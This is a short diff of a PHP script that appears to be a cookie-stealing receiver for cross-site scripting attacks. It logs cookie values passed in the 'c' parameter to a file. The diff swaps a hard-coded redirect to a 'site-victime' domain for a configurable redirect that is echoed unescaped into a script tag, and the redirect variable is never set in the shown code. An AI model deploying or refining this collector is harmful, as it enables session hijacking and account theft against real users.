@@ -1,6 +1,7 @@
 <?php
 /***
 *  input : URL?c = [...]
+*             &r = redirection 
 ***/
 $cookie = isset($_GET["c"]) ? $_GET["c"] : NULL;
 
@@ -12,7 +13,9 @@ if($cookie)
  fputs($fp,">>>" . "\r\n\r\n");
  fclose($fp); 
 }
+
+if($redirection){
+ echo '<script>location.replace("'. $redirection .'");</script>'; 
+} 
+
 ?>
-<script>
-location.replace("http://www.site-victime.com");
-</script>
